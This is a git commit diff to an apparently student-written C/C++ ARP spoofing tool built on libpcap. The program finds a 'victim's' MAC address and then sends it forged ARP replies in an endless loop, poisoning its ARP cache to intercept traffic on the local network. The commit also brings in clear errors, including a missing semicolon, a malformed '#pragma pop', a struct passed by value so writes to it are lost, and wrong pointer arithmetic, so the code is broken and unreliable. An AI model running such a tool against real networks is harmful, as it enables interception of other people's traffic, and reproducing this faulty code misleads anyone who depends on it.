4b7bb3354b8a84e6abee0c7fdec2310d8f34b0cd
Lee-yongwoo <gofl0306@naver.com>
2019-08-06 01:04:22 -0700

    Add packet struct

--- main.cpp
+++ main.cpp
@@ -23,7 +23,7 @@ struct ETHERNET {
 };
 
 // arp header
-#pragma pack(1) // alloc memory to variables by 1 bytes (default is 4bytes)
+#pragma pack(push,1) // alloc memory to variables by 1 bytes (default is 4bytes)
 struct ARP {
 	uint16_t hdw_type;
 	uint16_t pro_type;
@@ -34,6 +34,12 @@ struct ARP {
 	uint32_t sender_ip :32;
 	uint8_t target_mac[6];
 	uint32_t target_ip :32;
+};
+#pragma pop
+
+struct PACKET {
+	ETHERNET eth;
+	ARP arp;
 };
 
 void print_mac(uint8_t *mac) {
@@ -109,28 +115,29 @@ void getIpAddress(char *iface, uint32_t &my_ip) {
 }
 
 // make ARP packet
-void *make_arp(u_char *packet, uint8_t *s_mac, uint8_t *d_mac, int opcode, 
+void *make_arp(PACKET packet, uint8_t *s_mac, uint8_t *d_mac, int opcode, 
 		uint8_t *sender_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip, int *packet_len) {
 	
 	ETHERNET eth = make_eth_hdr(s_mac, d_mac);
 	ARP arp = make_arp_hdr(opcode, sender_mac, sender_ip, target_mac, target_ip);
 	
-	memcpy(packet, &eth, sizeof(eth));
+	memcpy(&packet, &eth, sizeof(eth));
 	*packet_len += sizeof(eth);
-	memcpy(packet+*packet_len, &arp, sizeof(arp));
+	memcpy(&packet+*packet_len, &arp, sizeof(arp));
 	*packet_len += sizeof(arp);
 }
 
 
 // find sender's mac address from sender's ip address by arp protocol
-int find_sender_mac(const u_char *packet, uint8_t *sender_mac, uint32_t sender_ip, uint32_t my_ip) {
+int find_sender_mac(const u_char *packet, uint8_t *sender_mac, uint8_t *my_mac, uint32_t sender_ip, uint32_t my_ip) {
 	ETHERNET *eth = (struct ETHERNET*) packet;
 	if (ntohs(eth->type) == ETH_TYPE_ARP) {
 		ARP *arp = (struct ARP*) &packet[ETH_HDR_LEN];
 		
-		if (htons(arp->opcode) == 0x2 			// if arp reply packet
-			&& arp->target_ip == my_ip 			// if destination ip is my ip
-			&& arp->sender_ip == sender_ip) {	// if source ip is sender ip
+		if (htons(arp->opcode) == REPLY 			// if arp reply packet
+			&& arp->target_ip == my_ip 				// if target ip is my ip
+			&& arp->sender_ip == sender_ip			// if source ip is sender ip
+			&& !memcmp(arp->target_mac, my_mac, 6)) {		// if target mac is my mac
 
 			memcpy(sender_mac, arp->sender_mac, 6);
 			return 1;
@@ -155,6 +162,7 @@ int main(int argc, char *argv[]) {
 		usage();
 		return -1;
 	}
+
 	uint8_t sender_mac[6];
 	uint8_t my_mac[6];
 	uint8_t broadcast_mac[6];
@@ -189,8 +197,8 @@ int main(int argc, char *argv[]) {
 
 	// make request packet (broadcast)
 	int packet_len = 0;
-	u_char request_packet[100];
-	memset(request_packet, 0, 100);
+	PACKET request_packet;
+	memset(&request_packet, 0, sizeof(request_packet));
 
 	make_arp(request_packet, my_mac, broadcast_mac, REQUEST, my_mac, my_ip, unknown_mac, sender_ip, &packet_len);
 
@@ -198,7 +206,7 @@ int main(int argc, char *argv[]) {
 	while (true) {
 		// send requset packet until get sender's arp reply packet
 		if (count % 10 == 0) {
-			pcap_sendpacket(handle, request_packet, packet_len);
+			pcap_sendpacket(handle, (uint8_t*)(&request_packet), packet_len);
 			printf("\n[*] Send request packet to sender(victim)!\n");
 			count = 0;
 		}
@@ -208,7 +216,7 @@ int main(int argc, char *argv[]) {
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
 
-		if (find_sender_mac(packet, sender_mac, sender_ip, my_ip))
+		if (find_sender_mac(packet, sender_mac, my_mac, sender_ip, my_ip))
 			break;
 	}
 
@@ -218,16 +226,17 @@ int main(int argc, char *argv[]) {
 	printf("[+] Victim's IP address\t\t: ");
 	print_ip(sender_ip);
 
-	u_char attack_packet[100];
-	memset(attack_packet, 0, 100);
 
 	// make attack packet (unicast)
-	packet_len = 0;
+	packet_len = 0
+	PACKET attack_packet;
+	memset(&attack_packet, 0, sizeof(attack_packet));
+
 	make_arp(attack_packet, my_mac, sender_mac, REPLY, my_mac, target_ip, sender_mac, sender_ip, &packet_len);
 
 	printf("\n[*] Sending attack packet to sender(victim)!\n");
 	while (true) {
-		pcap_sendpacket(handle, attack_packet, packet_len);
+		pcap_sendpacket(handle, (uint8_t*)(&attack_packet), packet_len);
 		sleep(3);
 	}
 }
